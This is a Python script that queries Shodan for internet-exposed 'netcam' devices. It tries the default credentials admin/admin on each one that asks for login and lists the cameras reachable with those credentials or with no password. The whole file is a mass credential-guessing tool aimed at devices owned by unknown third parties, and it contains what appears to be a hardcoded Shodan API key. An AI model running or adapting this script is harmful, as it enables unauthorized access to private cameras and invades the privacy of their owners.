#!/usr/bin/env python3


import shodan
import requests
import time
import sys
import re
from requests.auth import HTTPBasicAuth
from requests.packages.urllib3.exceptions import InsecureRequestWarning

SHODAN_API_KEY = "4oIXf6kQIVHdIJO7paSaz63kb1TxkUGl"
searchkeys = ["netcam"]

def search():
    ips = []
    print("SEARCHING IPS")
    try:
        for i in searchkeys:
            results = shodan.Shodan(SHODAN_API_KEY).search(i)
            for result in results['matches']:
                ips.append(result['ip_str'])
    except shodan.APIError:
        print('Error: %s')
    print("done: found "+str(len(ips)))
    return ips


def tryip():
    requests.packages.urllib3.disable_warnings()
    matched = {}
    ips = search()
    print("CHECKING IPS")
    for i in ips:
        try:
            #TODO 4testing timeout=3, else set to 20
            r = requests.get("http://"+str(i), timeout=3)
            if r.status_code == 401:
                r = requests.get('http://'+str(i), auth=HTTPBasicAuth('admin', 'admin'))
                if r.status_code == 200:
                    #print(str(r.status_code) + " login: admin,admin: " + str(i))
                    matched[i] = {"admin","admin"} 
            elif r.status_code == 200:
                #print(str(r.status_code) + " no login: " + str(i))
                matched[i] = {"",""}
            elif r.status_code == 404:
                pass
        except requests.ConnectionError:
            pass
    print("done")
    print(matched)
    return matched


def testip():
    testip = []
    alain = open('testip', 'r')
    for i in alain:
        testip.append(i.replace("\n", ""))

if __name__ == '__main__':
    try:
        tryip()
    except KeyboardInterrupt:
        print()
        print("Cancelled")
        exit
    
